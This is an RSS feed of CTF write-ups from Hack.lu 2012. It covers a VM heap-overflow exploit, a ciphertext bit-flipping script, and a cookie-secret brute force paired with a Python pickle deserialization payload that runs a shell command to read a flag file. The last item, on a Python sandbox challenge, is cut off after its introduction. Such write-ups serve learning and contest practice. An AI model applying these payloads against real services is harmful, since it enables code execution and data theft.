<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: Hacklu</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>[writeup] Hacklu 2012 – Challenge #6 – BrainGathering – (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-26T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html</guid>
  <description><![CDATA[
     <p>I did not solve this during CTF and my mistake is not using IDA to decompile since it has some obfuscate.<br />
After CTF end, i use gdb to dump running process to binary file and<br />
analyze it again, try to finish it.</p>

<blockquote>
  <p>gdb –pid [PID]<br />
gdb&gt;info proc<br />
process 4660</p>

  <p>gdb&gt;shell cat /proc/4660/maps<br />
08048000-0804a000 rwxp 00000000 08:03 7213513</p>

  <p>gdb&gt;dump out.dmp 0×08048000 0x0804a000</p>
</blockquote>

<p>Load it to IDA and decompile. Basically it will loop and get an OPCODE<br />
from static array locate at address 0x804B060, and a action defined<br />
by that OPCODE will be run.</p>

<p>Just thinking a bit, when we input 0×36 bytes it will end up with a message:</p>

<blockquote>
  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>3<br />
### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
XPLOIT DETECTED, ALTERING KILLCODE</p>
</blockquote>

<p>In normal case when our string &lt; 0×36 bytes length:</p>

<blockquote>
  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>3<br />
### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
hello<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready</p>
</blockquote>

<p>It continue. So i think it must be a different when this vm handle<br />
our string. The execution flow will different in 2 cases. Let find out:</p>

<p>I set a breakpoint and print at 0x0804865B where it get OPCODE and put it<br />
in to EAX register.</p>

<blockquote>
  <p>b *0x0804865B<br />
commands 1<br />
p/x $ebx<br />
p/x $eax<br />
continue<br />
end</p>
</blockquote>

<p>Compare 2 results I have found where the execution alter:</p>

<p>First one is “B”*0×36:</p>

<blockquote>
  <p>0x081ea147 71<br />
0x081ea148 82<br />
0x081ea149 14<br />
0x081ea14a 53<br />
0x081ea14d 81<br />
0x081ea14e 40<br />
0x081ea150 74<br />
0x081ea151 41<br />
0x081ea152 86<br />
0x081ea153 68<br />
0x081ea154 74<br />
0x081ea155 58<br />
0x081ea4f3 3d<br />
0x081ea4f6 81<br />
0x081ea4f7 3f<br />
0x081ea4f9 53<br />
0x081ea4fc 28</p>
</blockquote>

<p>In normal case:</p>

<blockquote>
  <p>0×08515147 71<br />
0×08515148 82<br />
0×08515149 14<br />
0x0851514a 53<br />
0x0851514d 81<br />
0x0851514e 40<br />
0×08515150 74<br />
0×08515151 41<br />
0×08515152 86<br />
0×08515153 68<br />
0×08515154 74<br />
0×08515155 58<br />
0x0851531d 58<br />
0×08519149 53<br />
0x0851914c 53<br />
0x0851914f 53<br />
0×08519152 53</p>
</blockquote>

<p>The address in 2 case will same at offset, so we can compare easy.<br />
It start different when handle OPCODE 0×58.</p>

<blockquote>
  <p>case 0×58:<br />
v22 = *heap1_end2;<br />
++heap1_end2;<br />
PC += v22;<br />
continue;</p>
</blockquote>

<p>So v22 will change flow of execution because. I want to know why this happen:</p>

<blockquote>
  <p>gdb&gt;b *0x080487DE<br />
gdb&gt;commands 2<br />
&gt;p/x $ebx<br />
&gt;continue<br />
&gt;end</p>
</blockquote>

<p>And i end up with</p>

<blockquote>
  <p>…<br />
..<br />
Breakpoint 2, 0x080487de in close@plt ()<br />
$12 = 0×4242</p>
</blockquote>

<p>Yeah, so we can control v22. Let look into hex-rays source to see why this happen:</p>

<p>In OPCODE 0x3F</p>

<blockquote>
  <p>case 0x3F:<br />
v40 = *PC++;<br />
v41 = v4;<br />
READ(v40, &amp;PC[v61], 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC));<br />
v4 = v41;<br />
continue;</p>
</blockquote>

<p>It will read our string to PC[v61] with a size result from calculation: 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC)<br />
Since result from v22 we can understand an overflow occur, last 2 bytes of our string overwrite value at heap1_end2.<br />
When OPCODE 0×58 is processed, PC will increase base on that 2 bytes.</p>

<p>Now the time for exploitation, first we need to calculate offset beetween PC at that time and our string.</p>

<blockquote>
  <p>gdb&gt;b *0x080487DE if $ebx=0×4242<br />
gdb&gt;c<br />
…..<br />
gdb&gt;x/20wx $edi-0×40<br />
0x8343fb5: 0×00000000 0×00000000 0×00000000 0×00000000<br />
0x8343fc5: 0x700e4242 0×00007010 0×00000000 0×42424242<br />
0x8343fd5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
0x8343fe5: 0×42424242 0×00104242 0x7000ffc9 0x01e38010<br />
0x8343ff5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
gdb&gt; x/x $esp+0x2c<br />
0xffe8648c: 0×08334008<br />
gdb&gt; p/x 0x8343fd5-0×08334008<br />
$5 = 0xffcd</p>
</blockquote>

<p>So just to confirm i’ll return to 0×40 ( write OPCODE) :</p>

<blockquote>
  <p>python -c ‘print “3″*34+”x40″*41+”xffxcd”*7′ &gt; file</p>
</blockquote>

<p>And:</p>

<blockquote>
  <p>./braingathering &lt; file<br />
==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz</p>
</blockquote>

<p>And make sure index of byte we can start our shellcode:</p>

<blockquote>
  <p>python -c ‘print “3″*34+”A”*6+”x40″+”B”*34+”xffxcd”*7′ &gt; file<br />
./braingathering &lt; file<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>INVALID</p>
</blockquote>

<p>In OPCODE 0×40:</p>

<blockquote>
  <p>case 0×40:<br />
v36 = *PC++;<br />
v37 = 2;<br />
v63 = v4;<br />
if ( v36 &lt;= 1u )<br />
v37 = v36;<br />
v38 = v37;<br />
len = STRLEN(&amp;PC[v61]);<br />
WRITE(v38, &amp;PC[v61], len);<br />
v4 = v63;<br />
continue;</p>
</blockquote>

<p>Finally. We findout where content of killcode existence in memory.<br />
Let find where it is:</p>

<blockquote>
  <p>gdb-peda$ searchmem KILLCODE heap<br />
Searching for ‘KILLCODE’ in: heap ranges<br />
Found 1 results, display max 1 items:<br />
[heap] : 0x838b008 (“KILLCODEn## Warn”)<br />
gdb-peda$ p/x 0x838b008-0×08383008<br />
$1 = 0×8000</p>
</blockquote>

<p>And we need to reset v61 to 0×8000 We use OPCODE 0×49</p>

<blockquote>
  <p>case 0×49:<br />
v29 = PC[1];<br />
v30 = *PC;<br />
PC += 2;<br />
v61 = (v29 « 8) | v30;<br />
continue;</p>
</blockquote>

<p>And final exploit ( so lucky since v61 has value 0 at that time)</p>

<blockquote>
  <p>$echo “FUKCING KILLCODE” &gt; killcode</p>

  <p>$python -c ‘print “3″*34+”A”*6+”x49x00x80x40″+”B”*31+”xffxcd”*7′ &gt; file<br />
./braingathering &lt; file<br />
==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>FUKCING KILLCODE</p>
</blockquote>

<p>and hex-rays source:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80485E0()
{
  BYTE *PC; // esi@1 MAPDST
  int index; // eax@1
  _WORD *heap1_end2; // edi@3
  int v4; // edx@3
  char opCode; // al@4
  int v6; // ST3C_4@5
  unsigned __int16 v7; // ax@6
  int v8; // eax@11
  int v9; // esi@12
  __int16 v10; // si@15
  __int16 v11; // ax@15
  char v12; // si@16
  int v13; // ecx@16
  unsigned __int16 v14; // cx@19
  char v15; // si@23
  int v16; // eax@23
  unsigned __int16 v17; // si@26
  __int16 v18; // si@27
  __int16 v19; // ax@27
  char v20; // si@30
  int v21; // eax@30
  int v22; // ebx@33
  __int16 v23; // si@36
  __int16 v24; // ax@36
  __int16 v25; // si@37
  __int16 v26; // ax@37
  __int16 v27; // si@38
  __int16 v28; // cx@38
  __int16 v29; // ax@39
  __int16 v30; // cx@39
  __int16 v31; // si@45
  __int16 v32; // ax@45
  int v33; // ST3C_4@47
  int v34; // ST3C_4@48
  unsigned __int16 v35; // ax@48
  unsigned __int16 v36; // si@50
  signed int v37; // eax@50
  signed int v38; // ST40_4@52
  int len; // eax@52
  unsigned __int16 v40; // si@53
  int v41; // ST3C_4@53
  __int16 v42; // si@54
  unsigned __int16 v43; // ax@54
  __int16 v44; // si@55
  __int16 v45; // ax@55
  __int16 v46; // si@57
  __int16 v47; // ax@57
  BYTE v48; // si@59
  int v49; // ecx@59
  int v50; // eax@63
  __int16 v51; // si@67
  unsigned __int16 v52; // ax@67
  BYTE v53; // si@77
  int v54; // ecx@77
  __int16 v55; // si@80
  __int16 v56; // ax@80
  char v57; // si@82
  int v58; // eax@82
  int v59; // eax@85
  unsigned __int16 v61; // [sp+1Eh] [bp-42h]@3
  int v63; // [sp+3Ch] [bp-24h]@50
  BYTE *heap1_end1; // [sp+44h] [bp-1Ch]@3
  unsigned __int16 v65; // [sp+48h] [bp-18h]@3
  unsigned __int16 v66; // [sp+4Ah] [bp-16h]@3

  PC = (BYTE *)malloc_(65535);
  memset_((int)PC, 0, 65535);
  index = 0;
  do
  {
    PC[index] = byte_804B060[index];
    ++index;
  }
  while ( index != 2068 );
  heap1_end1 = PC + 65535;
  heap1_end2 = PC + 65535;
  v4 = 0;
  v65 = 0;
  v66 = 0;
  v61 = 0;
  while ( 1 )
  {
    opCode = *PC++;
    switch ( opCode )
    {
      default:
        continue;
      case 0x90:
        v6 = v4;
        sleep_();
        v4 = v6;
        continue;
      case 0x86:
        v7 = *heap1_end2;
        ++heap1_end2;
        v65 = v7;
        continue;
      case 0x82:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v65;
        continue;
      case 0x81:
        v61 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x7B:
        v8 = v4 &amp; 0x1FFF;
        if ( v66 == v65 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v66;
        }
        else
        {
          HIWORD(v9) = HIWORD(v4);
          LOWORD(v4) = v8 | 0x8000;
          if ( v66 &gt;= v65 )
          {
            LOWORD(v9) = v8 | 0x4000;
            v4 = v9;
          }
        }
        continue;
      case 0x79:
        v10 = PC[1];
        v11 = *PC;
        PC += 2;
        v65 -= (v10 &lt;&lt; 8) | v11;
        continue;
      case 0x75:
        v12 = *PC++;
        v13 = v4 | 0x8000;
        LOWORD(v4) = v4 &amp; 0x7FFF;
        if ( v12 )
          v4 = v13;
        continue;
      case 0x74:
        v14 = *heap1_end2;
        ++heap1_end2;
        v61 = v14;
        continue;
      case 0x71:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v66;
        continue;
      case 0x69:
        v15 = *PC++;
        v16 = v4 | 0x40;
        v4 &amp;= 0xFFFFFFBFu;
        if ( v15 )
          v4 = v16;
        continue;
      case 0x68:
        v17 = *heap1_end2;
        ++heap1_end2;
        v66 = v17;
        continue;
      case 0x66:
        v18 = PC[1];
        v19 = *PC;
        PC += 2;
        v66 = (v18 &lt;&lt; 8) | v19;
        continue;
      case 0x61:
        v61 ^= (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        goto LABEL_29;
      case 0x5C:
        v20 = *PC++;
        v21 = v4 | 0x20;
        v4 &amp;= 0xFFFFFFDFu;
        if ( v20 )
          v4 = v21;
        continue;
      case 0x58:
        v22 = *heap1_end2;
        ++heap1_end2;
        PC += v22;
        continue;
      case 0x53:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        v23 = PC[1];
        --heap1_end2;
        v24 = *PC;
        PC += 2;
        *heap1_end2 = (v23 &lt;&lt; 8) | v24;
        continue;
      case 0x4F:
        v25 = PC[1];
        v26 = *PC;
        PC += 2;
        v61 += (v25 &lt;&lt; 8) | v26;
        continue;
      case 0x4B:
        v27 = PC[1];
        v28 = *PC;
        PC += 2;
        v65 = (v27 &lt;&lt; 8) | v28;
        continue;
      case 0x49:
        v29 = PC[1];
        v30 = *PC;
        PC += 2;
        v61 = (v29 &lt;&lt; 8) | v30;
        continue;
      case 0x47:
        if ( (v4 &amp; 0x2010) == 8208 || v4 &amp; 0x40 &amp;&amp; (unsigned __int16)v4 &gt;&gt; 15 || (v4 &amp; 0x4020) == 16416 )
          PC += *PC | (PC[1] &lt;&lt; 8);
        else
LABEL_29:
          PC += 2;
        continue;
      case 0x45:
        v31 = PC[1];
        v32 = *PC;
        PC += 2;
        v65 += (v31 &lt;&lt; 8) | v32;
        continue;
      case 0x43:
        if ( v61 &gt; 2u )
        {
          v33 = v4;
          close_(v61);
          v4 = v33;
        }
        continue;
      case 0x42:
        v34 = v4;
        v35 = OPEN(&amp;PC[v61], 0);
        v4 = v34;
        v61 = v35;
        continue;
      case 0x41:
        v4 = *heap1_end2;
        ++heap1_end2;
        continue;
      case 0x40:
        v36 = *PC++;
        v37 = 2;
        v63 = v4;
        if ( v36 &lt;= 1u )
          v37 = v36;
        v38 = v37;
        len = STRLEN(&amp;PC[v61]);
        WRITE(v38, &amp;PC[v61], len);
        v4 = v63;
        continue;
      case 0x3F:
        v40 = *PC++;
        v41 = v4;
        READ(v40, &amp;PC[v61], 0xFFFF - (unsigned __int16)((_WORD)heap1_end2 - (_WORD)PC));
        v4 = v41;
        continue;
      case 0x3D:
        v42 = PC[1];
        v43 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 - ((unsigned __int16)(v42 &lt;&lt; 8) | v43);
        continue;
      case 0x3A:
        v44 = PC[1];
        v45 = *PC;
        PC += 2;
        v61 -= (v44 &lt;&lt; 8) | v45;
        continue;
      case 0x39:
        v61 += v66;
        continue;
      case 0x36:
        v46 = PC[1];
        v47 = *PC;
        PC += 2;
        v66 += (v46 &lt;&lt; 8) | v47;
        continue;
      case 0x33:
        v66 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x31:
        v48 = *PC;
        v49 = v4;
        ++PC;
        BYTE1(v49) |= 0x20u;
        BYTE1(v4) &amp;= 0xDFu;
        if ( v48 )
          v4 = v49;
        continue;
      case 0x30:
        *(_WORD *)&amp;PC[v61] = v66;
        continue;
      case 0x2C:
        v50 = v4 &amp; 0x1FFF;
        if ( v61 == v65 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v61;
        }
        else
        {
          LOWORD(v4) = v50 | 0x8000;
          BYTE1(v50) |= 0x40u;
          if ( v61 &gt;= v65 )
            v4 = v50;
        }
        continue;
      case 0x28:
        v51 = PC[1];
        v52 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 + ((unsigned __int16)(v51 &lt;&lt; 8) | v52);
        continue;
      case 0x27:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = (_WORD)PC + 2 - (_WORD)PC;
        PC += (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        break;
      case 0x25:
        v61 -= v66;
        break;
      case 0x24:
        v65 = (_WORD)heap1_end2 - (_WORD)PC;
        break;
      case 0x21:
        v61 = *(_WORD *)&amp;PC[v66];
        break;
      case 0x20:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
        {
terminate_:
          put_("VM PROTECTION FAIL, TERMINATING");
          exit_(1);
        }
        --heap1_end2;
        *heap1_end2 = v61;
        break;
      case 0x17:
        v53 = *PC;
        v54 = v4;
        ++PC;
        BYTE1(v54) |= 0x40u;
        BYTE1(v4) &amp;= 0xBFu;
        if ( v53 )
          v4 = v54;
        break;
      case 0x16:
        v55 = PC[1];
        v56 = *PC;
        PC += 2;
        v66 -= (v55 &lt;&lt; 8) | v56;
        break;
      case 0x14:
        --heap1_end2;
        *heap1_end2 = v4;
        break;
      case 0xD:
        v57 = *PC++;
        v58 = v4 | 0x10;
        v4 &amp;= 0xFFFFFFEFu;
        if ( v57 )
          v4 = v58;
        break;
      case 0xA:
        v59 = v4 &amp; 0x1FFF;
        if ( v61 == v66 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v66 = v61;
        }
        else
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v59) |= 0x40u;
          LOWORD(v4) = v4 | 0x8000;
          if ( v66 &lt;= v61 )
            v4 = v59;
        }
        break;
      case 0xFF:
        return 0;
    }
  }
}
</pre>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 &#8211; Challenge #10 (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-10-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-10-500.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>10 – zlotpy<br />
Gambling time. Play against the Internet Zlot Machine at ctf.fluxfingers.net tcp/2053 This challenge has two stages.</p>

  <p>1) Medium: Investigate the contents of a saved game.</p>

  <p>2) Hard: Get 8 (EIGHT) bonus points. Good luck! Hint: We have some sourcecode for you! https://ctf.fluxfingers.net/challenges/zlot.py</p>
</blockquote>

<p>At the first sight, we thought this challenge was about Padding Oracle, but it turned out that Bit Flipping attack should be enough to solve.<br />
First step is to send ‘S’ and get back the ciphertext representing current game state</p>

<blockquote>
  <p>Welcome to the Internet ZlotMachine. Enter ‘T’ for the Tutorial.<br />
Your current balance is 5 credits and 1 bonus<br />
S<br />
Your games has been saved! Please write down the following save game code.<br />
WVIagr4eWOGCHi/CSQg1oKEgZneHnJJIm5LJjJeacngsTG1hm9jfygT6ZpBrsFihNKoef165OP2pb+tacn+9FlV+CfKjelFHS4MykxpJcYk=<br />
This game may later be loaded with L</p>
</blockquote>

<p>If we send this cipher back to the server, it will return <strong>“Your current balance is 5 credits and 1 bonus”</strong></p>

<p>The code below will loop throuth each byte of the cipher text, increase the value by one and ask the server to load that newly created gamestate.</p>

<pre class="brush: python; title: ; notranslate" title="">s = socket(AF_INET, SOCK_STREAM)
s.connect(("ctf.fluxfingers.net",2053))
s.recv(1024)&lt;/code&gt;

responses = set()

def send_request(data):
    try:
        s.send("L"+data+"n")
    except:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("ctf.fluxfingers.net",2053))
        s.recv(1024)
        s.send("L"+data+"n")&lt;/code&gt;

    r = s.recv(1024)

    if r not in responses:
        responses.add(r)
        print r

orig_cipher = base64.b64decode("mzIbwjPTw6hMVcp5DsRZGJykuaWXYaukFOEvUT5xVFLfjqQahbCTNsjXYYUawNEc+XFBV689Y/LPD8YYqKy+Z4DqS1uh9yva1ICjyphYbC8=")
fake_cipher = orig_cipher
l = len(orig_cipher)
for i in range(l):
    print "Try with character #%d"%i
    fake_cipher = set_byte(orig_cipher, i, chr((ord(fake_cipher[i])+1)%256) )
    send_request(base64.b64encode(fake_cipher))
</pre>

<p>The response will look like this:</p>

<blockquote>
  <p>Try with character #9<br />
Try with character #10<br />
Restored state.<br />
Your current balance is 5 credits and 0 bonus</p>

  <p>Try with character #11<br />
Error loading game: Expecting , delimiter: line 1 column 11 (char 11)</p>
</blockquote>

<p>Looking at the result, we notice that changing value of byte #10 will cause the bonus value changed.<br />
Now we simply brute the value of this byte until getting the flag:</p>

<pre class="brush: python; title: ; notranslate" title="">orig_cipher = base64.b64decode("mzIbwjPTw6hMVcp5DsRZGJykuaWXYaukFOEvUT5xVFLfjqQahbCTNsjXYYUawNEc+XFBV689Y/LPD8YYqKy+Z4DqS1uh9yva1ICjyphYbC8=")
fake_cipher = orig_cipher
l = len(orig_cipher)
for i in range(256):
    index = 10
    fake_cipher = set_byte(fake_cipher, index, chr((ord(fake_cipher[index])+i)%256) )
    send_request(base64.b64encode(fake_cipher))
</pre>

<p>We will see the flag after a few minutes:</p>

<blockquote>
  <p>Restored state.<br />
Your current balance is 5 credits and 5 bonus</p>

  <p>Restored state.<br />
Your current balance is 5 credits and 8 bonus<br />
Nice one. Here’s your flag: 9eef8f17d07c4f11febcac1052469ab9</p>
</blockquote>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 &#8211; Challenge #19 &#8211; Zombie Reminder &#8211; (200)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-19-zombie-reminder-200.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-19-zombie-reminder-200.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>19 – Zombie Reminder<br />
Zombies love brains. But zombies forget, so they have a tool where they can enter the location of brains they found. In a heroic mission someone managed to obtain both the source code and the information that a critical file can be found at ‘/var/www/flag’.<br />
Your mission is to obtain the contents of this file by any means and avenge your fallen friend!<br />
Service: https://ctf.fluxfingers.net:2073/<br />
Source: https://ctf.fluxfingers.net/challenges/zombie_reminder.py</p>
</blockquote>

<p>This challenge is a web application returning an arbitrary text that inputed by you previously. Your input is stored in “location” cookie with format of “<strong>&lt;hash_digest&gt;!&lt;encoded_input&gt;</strong>” where:</p>

<ul>
  <li>encoded_input = base64_encode(pickle.dumps(your_input))</li>
  <li>hash_digest = sha256(encoded_input+secret_key)</li>
</ul>

<p>When you go back to the main page, if a valid cookie is set the application will load the pickle object from cookie and print it out.&lt;/p&gt; &lt;pre class="brush: plain; title: ; notranslate" title=""&gt;location = pickle.loads(b64d(location))
&lt;/pre&gt;</p>

<p>The purpose of hash_digest is to ensure that your_input is a <strong>string</strong> submitted through challenge’s web form. However this design has 2 major flaws:</p>

<ul>
  <li>secret_key is too short (5 characters)</li>
  <li>pickle has a known security issue (<a href="http://nadiana.com/python-pickle-insecure">http://nadiana.com/python-pickle-insecure</a>)</li>
</ul>

<p>We submit a random string (let’s say “test”) and look at the cookie:<br />
location=”04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37!VnRlc3QKcDAKLg==”</p>

<p>We use this script to bruteforce the secret key :</p>

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python

import multiprocessing
from hashlib import *
import string
import sys

s = string.ascii_letters + string.digits
location = "VnRlc3QKcDAKLg=="
digest = "04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37"

print len(s)

WORKERS    = 8

def worker(start,end):

    for i1 in s[start:end]:
        for i2 in s:
            for i3 in s:
                for i4 in s:
                    for i5 in s:
                        secret  = i1+i2+i3+i4+i5

                        if sha256("%s%s" % (location, secret)).hexdigest() == digest:
                            print "*******", secret
                            sys.exit(0)

def main():

    ps = []
    for i in range(WORKERS):
        if i == WORKERS -1:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),len(s),))
        else:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),(i+1)*(len(s)/WORKERS),))
        tmp.start()
        ps.append(tmp)

    for p in ps:
        p.join()

    return jobs.empty()

if __name__ == '__main__':
    main()
</pre>

<p>After a few minutes we managed to find the key <strong>oIqxe</strong>. Our next task is to build a pickled representation of a python code object, the goal is to execute a code similar to this when pickle.loads() is called:</p>

<pre class="brush: plain; title: ; notranslate" title="">__import__("commands").getoutput("cat /var/www/flag")
</pre>

<p>This code is used to generate such serialized string:</p>

<pre class="brush: plain; title: ; notranslate" title="">import pickle, new

def nasty(module, function, *args):
        return pickle.dumps(new.classobj(function, (), {'__getinitargs__': lambda self, arg = args: arg, '__module__': module}) ())

t = nasty("commands", "getoutput", "cat /var/www/flag")

print repr(t)

# Output: "(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb."
</pre>

<p>Now we have everything to get the flag, time to build a valid cookie:</p>

<pre class="brush: plain; title: ; notranslate" title="">from hashlib import sha256
import base64
b64e=base64.b64encode

secret = 'oIqxe'
location = b64e("(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb.")

cookie = "%s!%s" % (sha256("%s%s" % (location, secret)).hexdigest(), location)

print cookie
</pre>

<p>Place this cookie into your browser (don’t ask us how to do that lolz) and refresh, the flag will be right on the screen.</p>

<blockquote>
  <p>Hello, here is what we remember for you. If you want to change, delete or extend it, click below<br />
08ac40047dae3f6a36471d768dfcb1b7a8e18fb8</p>
</blockquote>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 – Challenge #13 &#8211; The Sandbox Terminal</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-13.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-13.html</guid>
  <description><![CDATA[
     <p><strong>Solved by w00d @ clgt<br />
***Thanks **g4mm4</strong> for giving many suggestions and draft the first version of the exploit<br />
*</p>

<blockquote>
  <p>13 – The Sandboxed Terminal (400)</p>

  <p>Since the zombie apocalypse started people did not stop to ask themselves how the whole thing began. An abandoned military base may lead to answers but after infiltrating the facility you find yourself in front of a solid steel door with a computer attached. Luckily this terminal seems to connect to a Python service on a remote server to reduce load on the small computer. While your team managed to steal the source, they need your Python expertise to hack this service and get the masterkey which should be stored in a file called key.</p>

  <p>https://ctf.fluxfingers.net:2076/c7238e81667a085963829e452223b47b/sandbox.py</p>
</blockquote>

<p>In this ctf, I bumped into a few python challenges. Though having been using it for a while, I’m still a novice and pretty much ill-prepared, it took me a lot of time to read articles about python security. There are many interesting ones which I might write in a separate blog, however they do not help me much to solve this challenge, the only thing they help is to keep me motivated.</p>

